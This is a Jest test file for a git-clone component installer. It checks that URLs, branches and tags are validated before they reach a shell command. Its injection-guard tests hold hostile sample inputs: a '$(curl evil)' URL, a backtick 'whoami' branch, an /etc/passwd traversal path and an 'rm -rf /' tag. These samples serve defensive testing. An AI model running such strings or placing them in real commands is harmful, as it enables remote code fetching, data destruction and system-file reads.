/**
 * ComponentInstallation — the git-clone install path.
 *
 * WRITTEN 2026-08-28 as phase-2 of the ADR-015 convergence: the largest of the
 * untested queue files (347 lines, TWO ServiceLocator fetch points), and the
 * one carrying an explicit SECURITY contract — refs and URLs are interpolated
 * into a shell-executed command, so the module validates them against tight
 * charsets first. Its own comment says sources "can come from user-supplied
 * custom integrations and imported settings files".
 *
 * The witness pins, in priority order:
 *  1. the injection guards (URL, tag, branch, and the `..` rule) — a refactor
 *     that drops one hands a shell-executed string to attacker-influenced input
 *  2. the seam the conversion moves: the fetched executor, the exact clone
 *     command, and its options
 *  3. the tag-resolution rule (a fetched latest release WINS over the
 *     configured fallback; the fetch happens only when a tag is configured)
 *  4. a non-zero clone exit throws rather than reporting success
 */

const mockExecute = jest.fn();
/**
 * CONVERTED 2026-08-28 (ADR-015): the executor is a constructor dependency now,
 * so this suite mocks the service registry NOT AT ALL. Assertions unchanged —
 * including the ones that pin the exact clone command and its options.
 */
const executor = { execute: mockExecute } as never;
jest.mock('fs/promises', () => ({
    mkdir: jest.fn().mockResolvedValue(undefined),
    access: jest.fn().mockRejectedValue(new Error('ENOENT')),
    rm: jest.fn().mockResolvedValue(undefined),
    writeFile: jest.fn().mockResolvedValue(undefined),
    readFile: jest.fn().mockRejectedValue(new Error('ENOENT')),
}));
jest.mock(
    'vscode',
    () => ({
        workspace: { getConfiguration: () => ({ get: (_k: string, d: string) => d }) },
    }),
    { virtual: true }
);

import { ComponentInstallation } from '@/features/components/services/componentInstallation';
import { TIMEOUTS } from '@/core/utils/timeoutConfig';
import { DEFAULT_SHELL } from '@/core/shell/defaultShell';
import type { ComponentInstance, TransformedComponentDefinition } from '@/types';
import type { Logger } from '@/types/logger';
import { createMockLogger } from '../../../helpers/loggerFake';

const PROJECT = '/projects/demo';

function makeLogger(): Logger {
    return createMockLogger() as unknown as Logger;
}

function makeDef(overrides: Record<string, unknown> = {}): TransformedComponentDefinition {
    return {
        id: 'eds-storefront',
        name: 'EDS Storefront',
        source: {
            url: 'https://github.com/skukla/kukla-bodea',
            branch: 'main',
            ...((overrides.source as Record<string, unknown>) ?? {}),
        },
        ...overrides,
    } as unknown as TransformedComponentDefinition;
}

const instance = (): ComponentInstance => ({ id: 'eds-storefront' }) as ComponentInstance;

function install(def = makeDef(), options = {}) {
    return new ComponentInstallation(makeLogger(), executor).installGitComponent(
        PROJECT,
        def,
        instance(),
        options as never
    );
}

/** The clone call is the FIRST execute; later ones are version detection. */
function cloneCall(): [string, Record<string, unknown>] {
    return mockExecute.mock.calls[0] as [string, Record<string, unknown>];
}

beforeEach(() => {
    jest.clearAllMocks();
    // Clone succeeds; version detection finds nothing (its own paths are
    // covered where they belong — this suite is about install + guards).
    mockExecute.mockResolvedValue({ code: 0, stdout: '', stderr: '' });
    global.fetch = jest.fn().mockResolvedValue({ ok: false, status: 404 }) as never;
});

describe('installGitComponent — the shell-injection guards', () => {
    it('REJECTS a URL outside the safe charset before it reaches the shell', async () => {
        const def = makeDef({ source: { url: 'https://github.com/a/b;$(curl evil)' } });

        await expect(install(def)).rejects.toThrow(/Invalid git URL/);
        expect(mockExecute).not.toHaveBeenCalled();
    });

    it('REJECTS a branch containing shell metacharacters', async () => {
        const def = makeDef({ source: { url: 'https://github.com/a/b', branch: 'main`whoami`' } });

        await expect(install(def)).rejects.toThrow(/Invalid git branch/);
        expect(mockExecute).not.toHaveBeenCalled();
    });

    it('REJECTS a traversal sequence even inside the safe charset', async () => {
        const def = makeDef({ source: { url: 'https://github.com/a/../../etc/passwd' } });

        await expect(install(def)).rejects.toThrow(/Invalid git URL/);
        expect(mockExecute).not.toHaveBeenCalled();
    });

    it('REJECTS an unsafe TAG resolved from config', async () => {
        const def = makeDef({
            source: {
                url: 'https://github.com/a/b',
                gitOptions: { tag: 'v1.0.0 && rm -rf /' },
            },
        });

        await expect(install(def)).rejects.toThrow(/Invalid git tag/);
        expect(mockExecute).not.toHaveBeenCalled();
    });

    it('throws when no source URL is configured at all', async () => {
        await expect(install(makeDef({ source: {} }))).rejects.toThrow(
            /Git source URL not provided/
        );
    });
});

describe('installGitComponent — the clone seam', () => {
    it('clones through the HANDED-IN executor with the exact command and options', async () => {
        await install();

        const [command, options] = cloneCall();
        expect(command).toBe(
            'git clone -b "main" "https://github.com/skukla/kukla-bodea" "/projects/demo/components/eds-storefront"'
        );
        expect(options).toEqual({
            timeout: TIMEOUTS.LONG,
            enhancePath: true,
            shell: DEFAULT_SHELL,
        });
    });

    it('honours a configured clone timeout over the default', async () => {
        const def = makeDef({
            source: { url: 'https://github.com/a/b', timeouts: { clone: 1234 } },
        });

        await install(def);

        expect(cloneCall()[1].timeout).toBe(1234);
    });

    it('adds --depth=1 only when the component asks for a shallow clone', async () => {
        const def = makeDef({
            source: {
                url: 'https://github.com/a/b',
                branch: 'main',
                gitOptions: { shallow: true },
            },
        });

        await install(def);

        expect(cloneCall()[0]).toContain('--depth=1');
    });

    it('a NON-ZERO clone exit throws — never a success result', async () => {
        mockExecute.mockResolvedValue({ code: 128, stdout: '', stderr: 'repository not found' });

        await expect(install()).rejects.toThrow(/Git clone failed: repository not found/);
    });

    it('reports success and returns the instance when the clone lands', async () => {
        const result = await install();

        expect(result.success).toBe(true);
        expect(result.component?.repoUrl).toBe('https://github.com/skukla/kukla-bodea');
        expect(result.component?.path).toBe('/projects/demo/components/eds-storefront');
    });
});

describe('installGitComponent — tag resolution', () => {
    it('a fetched LATEST release wins over the configured fallback tag', async () => {
        global.fetch = jest.fn().mockResolvedValue({
            ok: true,
            status: 200,
            json: async () => [{ tag_name: 'v9.9.9', prerelease: true }],
        }) as never;
        const def = makeDef({
            source: { url: 'https://github.com/skukla/kukla-bodea', gitOptions: { tag: 'v1.0.0' } },
        });

        await install(def);

        expect(cloneCall()[0]).toContain('--branch "v9.9.9"');
    });

    it('falls back to the configured tag when the release lookup fails', async () => {
        const def = makeDef({
            source: { url: 'https://github.com/skukla/kukla-bodea', gitOptions: { tag: 'v1.0.0' } },
        });

        await install(def);

        expect(cloneCall()[0]).toContain('--branch "v1.0.0"');
    });

    it('does NOT consult GitHub when no tag is configured (branch installs stay offline)', async () => {
        await install();

        expect(global.fetch).not.toHaveBeenCalled();
    });
});
